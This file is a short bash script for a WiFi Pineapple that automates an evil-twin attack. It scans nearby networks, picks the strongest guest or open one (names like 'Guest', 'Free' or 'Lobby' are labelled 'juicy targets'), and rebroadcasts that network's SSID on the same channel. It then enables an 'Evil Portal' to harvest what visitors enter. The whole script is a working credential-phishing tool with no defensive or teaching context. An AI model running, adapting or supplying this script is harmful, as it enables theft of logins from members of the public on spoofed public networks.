#!/bin/bash
# Auto-detect surrounding networks and clone the strongest open/guest signal
# Run on Pineapple via SSH

LOG="/tmp/spoof.log"
IFACE="wlan1mon"  # Monitor mode interface

echo "[*] Scanning for target networks..." | tee -a $LOG

# Scan and sort by signal strength, filter for common guest/open patterns
airodump-ng $IFACE --write /tmp/scan --output-format csv &
PID=$!
sleep 15
kill $PID 2>/dev/null

# Parse for juicy targets: "Guest", "Free", "Public", "Lobby", "Conference"
TARGET=$(grep -E "(Guest|Free|Public|Lobby|Conference|Meeting|Visitor)" /tmp/scan-01.csv | \
         awk -F',' '{print $14, $1, $4}' | sort -k3 -nr | head -1)

if [ -z "$TARGET" ]; then
    # Fallback: strongest open network
    TARGET=$(awk -F',' 'NR>2 && $6 ~ /OPN/ {print $14, $1, $4}' /tmp/scan-01.csv | \
             sort -k3 -nr | head -1)
fi

SSID=$(echo $TARGET | awk '{print $1}' | sed 's/^ *//;s/ *$//')
BSSID=$(echo $TARGET | awk '{print $2}' | sed 's/^ *//;s/ *$//')
CHANNEL=$(echo $TARGET | awk '{print $3}' | sed 's/^ *//;s/ *$//')

echo "[+] Target acquired: $SSID ($BSSID) Ch:$CHANNEL" | tee -a $LOG

# Configure Pineapple to broadcast cloned SSID
uci set wireless.@wifi-iface[1].ssid="$SSID"
uci set wireless.@wifi-iface[1].channel="$CHANNEL"
uci commit wireless
wifi reload

# Enable Evil Portal
evilportal enable universal-evil

echo "[+] Portal active. Harvesting at http://172.16.42.1:80" | tee -a $LOG
echo "[+] Logs writing to /tmp/evilportal.log" | tee -a $LOG
